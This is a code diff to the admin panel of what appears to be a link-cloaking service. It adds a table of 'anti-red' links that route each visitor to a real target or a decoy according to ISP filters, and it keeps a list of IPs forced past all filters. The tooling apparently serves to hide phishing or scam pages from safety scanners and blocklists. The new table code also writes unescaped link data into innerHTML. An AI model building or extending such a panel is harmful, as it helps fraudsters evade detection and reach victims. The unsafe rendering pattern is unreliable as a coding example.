@@ -273,6 +273,31 @@
             animation: terminal-entry 0.3s steps(4) forwards;
         }
 
+        .stacked-two-grid {
+            display: grid;
+            grid-template-rows: auto 1fr;
+            gap: 20px;
+        }
+
+        .stacked-two-grid > .grid-cell {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            padding: 25px;
+            position: relative;
+        }
+
+        .stacked-two-grid > .grid-cell h2 {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 18px;
+            margin-top: 0;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--accent);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
         @keyframes terminal-entry {
             0% { opacity: 0; transform: translateY(5px); filter: brightness(2) contrast(2); }
             50% { opacity: 0.5; transform: translateY(-2px); filter: brightness(1.5) contrast(1.5); }
@@ -469,15 +494,36 @@
             <button onclick="saveGlobalSettings()" style="margin-top: 20px;">[ SYNC_PROTOCOLS ]</button>
         </div>
 
-        <div id="forced-ip-section" class="card content-section">
-            <h2>FORCED_REDIRECT_OVERRIDE</h2>
-            <div style="max-width: 600px;">
-                <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 20px;">Force specific IP addresses to bypass all filters and reach the REAL_TARGET.</p>
-                <div style="display: flex; gap: 10px; margin-bottom: 20px;">
-                    <input type="text" id="newForcedIp" placeholder="0.0.0.0">
-                    <button onclick="addForcedIp()">[ AUTHORIZE_IP ]</button>
+        <div id="forced-ip-section" class="content-section">
+            <div class="stacked-two-grid">
+                <div class="grid-cell">
+                    <h2>FORCED_REDIRECT_OVERRIDE</h2>
+                    <div style="max-width: 600px;">
+                        <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 20px;">Force specific IP addresses to bypass all filters and reach the REAL_TARGET.</p>
+                        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+                            <input type="text" id="newForcedIp" placeholder="0.0.0.0">
+                            <button onclick="addForcedIp()">[ AUTHORIZE_IP ]</button>
+                        </div>
+                        <div id="forcedIpList" style="max-height: 300px; overflow-y: auto; background: var(--bg-elevated); padding: 10px; border: 1px solid var(--border); font-family: monospace;"></div>
+                    </div>
                 </div>
-                <div id="forcedIpList" style="max-height: 300px; overflow-y: auto; background: var(--bg-elevated); padding: 10px; border: 1px solid var(--border); font-family: monospace;"></div>
+                <div class="grid-cell">
+                    <h2>LINK_MANAGER</h2>
+                    <div class="table-container">
+                        <table id="forcedIpLinksTable">
+                            <thead>
+                                <tr>
+                                    <th>NAME</th>
+                                    <th>UNIQUE ANTI-RED LINK</th>
+                                    <th>TARGETS (REAL / SAFE)</th>
+                                    <th>EXPIRY</th>
+                                    <th>ACTIONS</th>
+                                </tr>
+                            </thead>
+                            <tbody id="forcedIpLinksTableBody"></tbody>
+                        </table>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -658,6 +704,45 @@
                 `;
                 tbody.appendChild(tr);
             });
+
+            const forcedTbody = document.getElementById('forcedIpLinksTableBody');
+            if (forcedTbody) {
+                forcedTbody.innerHTML = '';
+                [defaultLink, ...links].forEach(link => {
+                    const tr = document.createElement('tr');
+                    const fullUrl = window.location.origin + '/l/' + link.slug;
+
+                    const expiry = link.expiryDate ? new Date(link.expiryDate) : null;
+                    const isExpired = expiry ? expiry < new Date() : true;
+                    const expiryColor = isExpired ? 'var(--danger)' : 'var(--accent)';
+
+                    tr.innerHTML = `
+                        <td><strong>${link.name}</strong></td>
+                        <td>
+                            <code>${fullUrl}</code>
+                            <button onclick="copyToClipboard('${fullUrl}')" style="padding: 2px 8px; font-size: 10px; margin-left: 5px;">[ COPY ]</button>
+                        </td>
+                        <td style="font-size: 11px;">
+                            <div style="color: var(--accent);">TARGET: ${link.realLink}</div>
+                            <div style="color: var(--text-muted);">DECOY: ${link.nonRealLink}</div>
+                        </td>
+                        <td style="color: ${expiryColor}; font-size: 11px;">
+                            ${expiry ? expiry.toLocaleString() : 'UNINITIALIZED'}
+                        </td>
+                        <td>
+                            <div style="display: flex; gap: 5px;">
+                                <button onclick="showRenewal('${link.slug}', '${link.name}')" style="background: #17a2b8; color: white; border-color: #17a2b8; font-size: 10px;">[ RENEW ]</button>
+                                <button onclick="${link.isDefault ? 
+                                    `editDefaultLink('${link.slug}', '${link.realLink}', '${link.nonRealLink}', ${settings.antiRed}, ${settings.ispFilter}, ${JSON.stringify(settings.mobileIsps).replace(/"/g, '&quot;')}, ${settings.reallowVisited})` : 
+                                    `editLink('${link.slug}', '${link.name}', '${link.realLink}', '${link.nonRealLink}', ${link.antiRed}, ${link.ispFilter}, ${JSON.stringify(link.mobileIsps).replace(/"/g, '&quot;')}, ${link.reallowVisited})`}" 
+                                    style="background: var(--warning); color: black; border-color: var(--warning); font-size: 10px;">[ EDIT ]</button>
+                                ${link.isDefault ? '' : `<button onclick="deleteLink('${link.slug}')" class="btn-danger" style="font-size: 10px;">[ PURGE ]</button>`}
+                            </div>
+                        </td>
+                    `;
+                    forcedTbody.appendChild(tr);
+                });
+            }
         }
 
         function renderNewLinkIspList(selectedIsps = []) {
